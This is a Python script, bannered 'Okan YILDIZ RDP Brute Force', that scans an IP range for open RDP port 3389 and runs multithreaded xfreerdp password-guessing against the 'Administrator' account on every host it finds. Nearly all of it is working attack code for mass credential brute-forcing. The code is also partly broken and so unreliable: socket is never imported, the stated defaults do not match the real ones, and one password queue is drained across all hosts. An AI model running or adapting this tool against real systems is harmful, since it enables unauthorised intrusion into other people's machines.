import os
import sys
import time
import argparse
import subprocess
from concurrent.futures import ThreadPoolExecutor
from ipaddress import ip_network
import nmap
from queue import Queue

def parse_args():
    parser = argparse.ArgumentParser(description='Python script for brute forcing RDP login')
    parser.add_argument('--ip-range', type=str, required=True, help='IP address range to scan (CIDR notation)')
    parser.add_argument('--username', type=str, default='Administrator', help='username for RDP login (default: Administrator)')
    parser.add_argument('--password-file', type=str, required=True, help='path to file containing password list')
    parser.add_argument('--delay', type=int, default=0, help='delay between attempts in seconds (default: 5)')
    parser.add_argument('--max-attempts', type=int, default=1, help='maximum number of attempts (default: 5)')
    parser.add_argument('--threads', type=int, default=40, help='number of threads to use for brute forcing (default: 5)')
    return parser.parse_args()

def print_banner():
    banner = '''
                                   Okan YILDIZ RDP Brute Force
'''
    print(banner)

def check_rdp_access(ip, rdp_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, rdp_port))
        if result == 0:
            return True
        else:
            return False
        sock.close()
    except Exception as e:
        print(f"Error: {e}")
        return False

def brute_force(ip, username, rdp_port, max_attempts, password_queue):
    while not password_queue.empty():
        password = password_queue.get()
        attempts = 0
        while attempts < max_attempts:
            cmd = f'xfreerdp /u:{username} /p:{password} /v:{ip} /port:{rdp_port} +auth-only'
            result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if result == 0:
                print(f'Success! Password is {password} Ip Address {ip}')
                os._exit(0)
            else:
                print(f'Failed! Password is {password} Ip Address {ip}')
            attempts += 1
            

def scan_rdp_ports(ip):
    nm = nmap.PortScanner()
    nm.scan(ip, arguments='-p 3389 -Pn')
    if 'tcp' in nm[ip]:
        if nm[ip]['tcp'][3389]['state'] == 'open':
            return True
    return False

def main():
    print_banner()
    args = parse_args()
    ip_range = ip_network(args.ip_range)
    passwords = open(args.password_file, 'r').read().splitlines()
    password_queue = Queue()
    for password in passwords:
        password_queue.put(password)
    executor = ThreadPoolExecutor(max_workers=args.threads)
    for ip in ip_range.hosts():
        ip = str(ip)
        if scan_rdp_ports(ip):
            print(f"RDP server found at {ip}")
            for _ in range(args.threads):  # Start threads for brute force
                executor.submit(brute_force, ip, args.username, 3389, args.max_attempts, password_queue)
    time.sleep(args.delay)

if __name__ == '__main__':
    main()
